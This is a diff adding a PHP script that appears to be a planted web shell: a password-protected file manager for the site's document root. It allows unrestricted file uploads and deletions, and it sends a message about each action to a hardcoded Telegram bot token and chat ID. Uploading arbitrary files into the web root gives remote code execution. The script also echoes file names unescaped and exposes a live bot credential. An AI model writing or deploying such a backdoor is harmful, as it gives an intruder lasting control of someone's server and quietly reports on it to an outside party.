@@ -1,0 +1,150 @@
+<?php
+session_start();
+
+$passHash = '$2a$12$qbUBAVBufBYtIT9KbYq2VeSywq/9N8gXUyETmsOe8dHnxBjXsN.0O';
+
+// ================= TELEGRAM CONFIG =================
+$token = "8687462257:AAEzX81PQXglaSAcKi2pz1zg01Kb-XXBOQ4";
+$chat_id = "8259867883";
+
+function sendTele($msg, $token, $chat_id) {
+    static $sent = [];
+
+    // anti spam (jangan kirim pesan sama berulang)
+    if (in_array($msg, $sent)) return;
+    $sent[] = $msg;
+
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
+
+    $data = [
+        'chat_id' => $chat_id,
+        'text' => $msg
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    curl_exec($ch);
+    curl_close($ch);
+}
+
+// ================= LOGIN =================
+if (isset($_POST['p']) && password_verify($_POST['p'], $passHash)) {
+    $_SESSION['ok'] = true;
+}
+
+if (!isset($_SESSION['ok'])) {
+    echo '<form method="post" style="margin-top:50px;text-align:center;">
+            <input type="password" name="p" placeholder="Password">
+            <button>Login</button>
+          </form>';
+    return;
+}
+
+// ================= ROOT =================
+$base = realpath($_SERVER['DOCUMENT_ROOT']);
+
+// ================= NAV =================
+if (!isset($_SESSION['history'])) {
+    $_SESSION['history'] = [];
+}
+
+if (isset($_GET['back'])) {
+    array_pop($_SESSION['history']);
+}
+
+if (isset($_GET['dir'])) {
+    $dir = realpath($_GET['dir']);
+    if ($dir && strpos($dir, $base) === 0) {
+        $_SESSION['history'][] = $dir;
+    }
+}
+
+$current = !empty($_SESSION['history'])
+    ? end($_SESSION['history'])
+    : $base;
+
+// ================= DELETE =================
+if (isset($_GET['delete'])) {
+
+    $file = realpath($_GET['delete']);
+
+    if ($file && strpos($file, $base) === 0 && is_file($file)) {
+
+        $name = basename($file);
+
+        if (unlink($file)) {
+
+            echo "<p>🗑️ File dihapus: $name</p>";
+
+            $msg = "🗑️ FILE DIHAPUS\n";
+            $msg .= "Nama: $name\n";
+            $msg .= "Path: $file";
+
+            sendTele($msg, $token, $chat_id);
+
+        } else {
+            echo "<p>❌ Gagal hapus file</p>";
+        }
+    }
+}
+
+// ================= UPLOAD =================
+if (isset($_FILES['f'])) {
+
+    $name = basename($_FILES['f']['name']);
+    $target = $current . '/' . $name;
+
+    if (move_uploaded_file($_FILES['f']['tmp_name'], $target)) {
+
+        echo "<p>✅ Upload sukses</p>";
+
+        $msg = "📤 FILE UPLOAD\n";
+        $msg .= "Nama: $name\n";
+        $msg .= "Lokasi: $target";
+
+        sendTele($msg, $token, $chat_id);
+
+    } else {
+        echo "<p>❌ Upload gagal</p>";
+    }
+}
+
+// ================= UI =================
+echo "<h3>📂 Folder: $current</h3>";
+
+echo "<a href='?dir=" . urlencode($base) . "'>🏠 Home</a> ";
+
+$parent = dirname($current);
+if ($parent && strpos($parent, $base) === 0) {
+    echo "<a href='?dir=" . urlencode($parent) . "'>⬆️ Up</a> ";
+}
+
+if (!empty($_SESSION['history'])) {
+    echo "<a href='?back=1'>⬅️ Back</a>";
+}
+
+echo "<br><br>";
+
+echo "<ul>";
+foreach (scandir($current) as $f) {
+    if ($f == '.' || $f == '..') continue;
+    $full = $current . '/' . $f;
+
+    if (is_dir($full)) {
+        echo "📁 <a href='?dir=".urlencode($full)."'>$f</a><br>";
+    } else {
+        echo "📄 <a href='?file=".urlencode($full)."'>$f</a> 
+        <a href='?delete=".urlencode($full)."' onclick=\"return confirm('Hapus file ini?')\">❌</a><br>";
+    }
+}
+echo "</ul>";
+
+echo '<form method="post" enctype="multipart/form-data">
+        <input type="file" name="f">
+        <button>Upload</button>
+      </form>';
+?>
